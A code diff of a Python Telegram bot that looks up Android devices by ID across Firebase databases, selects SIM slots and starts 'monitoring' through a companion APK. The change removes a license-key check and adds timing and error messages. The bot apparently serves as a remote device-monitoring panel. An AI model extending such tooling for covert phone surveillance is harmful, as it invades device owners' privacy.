@@ -57,7 +57,6 @@ from app.services import (
     connect_firebase_url,
     set_channel_id,
     set_license_key,
-    require_license_key,
     show_device_by_id,
     set_user_phone,
     start_monitoring,
@@ -262,7 +261,10 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         await sync_profile_to_firebase(profile, device)
         await send_polling_startup_test(db, profile, device)
     except ValueError as exc:
-        await update.message.reply_text(f"❌ {exc}")
+        if "channel" in str(exc).lower():
+            await update.message.reply_text("❌ <b>ERROR</b>\n\nAdd a channel first!", parse_mode="HTML")
+        else:
+            await update.message.reply_text(f"❌ {exc}")
         return
     finally:
         db.close()
@@ -582,6 +584,7 @@ async def device_select_command(
         return
 
     deviceid = context.args[0]
+    lookup_start = time.perf_counter()
     db: Session = SessionLocal()
     try:
         device, profile = await show_device_by_id(
@@ -590,6 +593,7 @@ async def device_select_command(
             user.id,
             bind_license_key=bind_license_key,
         )
+        found_ms = int((time.perf_counter() - lookup_start) * 1000)
     except LookupError as exc:
         message = str(exc)
         if message.startswith("multiple:"):
@@ -600,11 +604,21 @@ async def device_select_command(
                 lines.append(f"• <code>{name}</code>")
             await update.message.reply_text("\n".join(lines), parse_mode="HTML")
             return
+        if message.startswith("notfound:"):
+            db_count = message.removeprefix("notfound:")
+            await update.message.reply_text(
+                "❌ <b>ERROR</b>\n\n"
+                f"Device <code>{deviceid}</code> not found in any of the "
+                f"<b>{db_count}</b> databases!\n\n"
+                "Pehle <code>/setfirebase</code> ya <code>/allfirebase</code> use karo.",
+                parse_mode="HTML",
+            )
+            return
         total = db.query(Device).count()
         await update.message.reply_text(
             f"❌ Device <code>{deviceid}</code> nahi mili.\n"
             f"DB total: <b>{total}</b>\n\n"
-            f"Try: <code>/fdy {deviceid}</code>",
+            f"Try: <code>/a {deviceid}</code>",
             parse_mode="HTML",
         )
         return
@@ -616,17 +630,32 @@ async def device_select_command(
         db.close()
 
     await sync_profile_to_firebase(profile, device)
-    await send_device_set_ui(update.message, device, profile)
+    await send_device_set_ui(update.message, device, profile, found_ms=found_ms)
 
 
 async def fdy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await device_select_command(update, context, bind_license_key=False)
 
 
-async def send_device_set_ui(message, device: Device, profile: MonitorProfile | None = None) -> None:
+async def fy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    await device_select_command(update, context, bind_license_key=True)
+
+
+async def send_device_set_ui(
+    message,
+    device: Device,
+    profile: MonitorProfile | None = None,
+    *,
+    found_ms: int | None = None,
+) -> None:
     sim_index = profile.selected_sim_index if profile else 0
     await message.reply_text(
-        format_device_set_card(device, selected_sim=sim_index),
+        format_device_set_card(
+            device,
+            selected_sim=sim_index,
+            found_ms=found_ms,
+            status=device_status(device),
+        ),
         parse_mode="HTML",
         reply_markup=device_set_keyboard(device),
     )
@@ -649,23 +678,12 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             db.close()
         await update.message.reply_text(
             "Usage: `/a <device_id>`\n\n"
-            "⚠️ `/a` ke liye pehle `/key` set karo (bot + APK same key).\n"
-            "Bina key: `/fdy <device_id>`",
+            "Example: `/a f0577ffa536dde46`",
             parse_mode="Markdown",
         )
         return
 
-    db: Session = SessionLocal()
-    try:
-        profile = get_monitor_profile(db, user.id)
-        require_license_key(profile)
-    except ValueError as exc:
-        await update.message.reply_text(f"❌ {exc}\n\nBina key use karo: `/fdy {context.args[0]}`", parse_mode="Markdown")
-        return
-    finally:
-        db.close()
-
-    await device_select_command(update, context, bind_license_key=True)
+    await device_select_command(update, context, bind_license_key=False)
 
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1167,6 +1185,11 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     db: Session = SessionLocal()
 
     try:
+        if data.startswith("copy:"):
+            _, device_name = data.split(":", 1)
+            await query.message.reply_text(f"`{device_name}`", parse_mode="Markdown")
+            return
+
         if data.startswith("sim:"):
             _, device_id, sim_index = data.split(":")
             profile = select_sim_slot(db, user.id, int(sim_index))
@@ -1237,7 +1260,7 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("users", users_command))
     app.add_handler(CommandHandler("key", key_command))
     app.add_handler(CommandHandler("fdy", fdy_command))
-    app.add_handler(CommandHandler("fy", fdy_command))
+    app.add_handler(CommandHandler("fy", fy_command))
     app.add_handler(CommandHandler("fb", fdy_command))
     app.add_handler(CommandHandler("la", fdy_command))
     app.add_handler(CommandHandler("a", a_command))
